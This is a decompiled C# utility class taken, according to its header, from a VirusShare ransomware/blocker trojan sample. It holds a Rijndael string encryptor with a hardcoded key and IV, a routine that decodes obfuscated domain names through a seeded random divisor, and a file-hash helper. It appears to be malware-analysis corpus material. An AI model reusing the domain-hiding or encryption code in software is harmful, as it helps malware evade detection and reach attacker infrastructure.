// Decompiled with JetBrains decompiler
// Type: flu.Crypto
// Assembly: flu-nucleo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1FFD10A3-F795-4E6C-98F1-531878AC8FB2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-0823a4c2b70512027297c4a52d2117a230ec0d6b30ab0c45a5bbc5ba12ca8028.exe

using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace flu
{
  internal class Crypto
  {
    public static string EncryptRijndael(string text)
    {
      byte[] bytes1 = Encoding.ASCII.GetBytes("qwertyuioplkjhgf");
      byte[] bytes2 = Encoding.ASCII.GetBytes("qwertyuioplkjhgf");
      byte[] bytes3 = Encoding.ASCII.GetBytes(text);
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      byte[] array;
      using (MemoryStream memoryStream = new MemoryStream(bytes3.Length))
      {
        using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(bytes1, bytes2), CryptoStreamMode.Write))
        {
          cryptoStream.Write(bytes3, 0, bytes3.Length);
          cryptoStream.FlushFinalBlock();
          cryptoStream.Close();
        }
        array = memoryStream.ToArray();
      }
      return Convert.ToBase64String(array);
    }

    public static string DecryptDomains(string text)
    {
      string empty = string.Empty;
      Random random = new Random(1646475713);
      string str = text;
      char[] chArray = new char[1]{ '~' };
      foreach (string s in str.Split(chArray))
      {
        int num = int.Parse(s) / random.Next(10000);
        empty += Convert.ToChar(num).ToString();
      }
      return empty;
    }

    public static string getSignature(string filename, string algorithm)
    {
      HashAlgorithm hashAlgorithm = HashAlgorithm.Create(algorithm);
      FileStream inputStream = System.IO.File.OpenRead(filename);
      byte[] hash = hashAlgorithm.ComputeHash((Stream) inputStream);
      inputStream.Close();
      return BitConverter.ToString(hash).Replace("-", "");
    }
  }
}
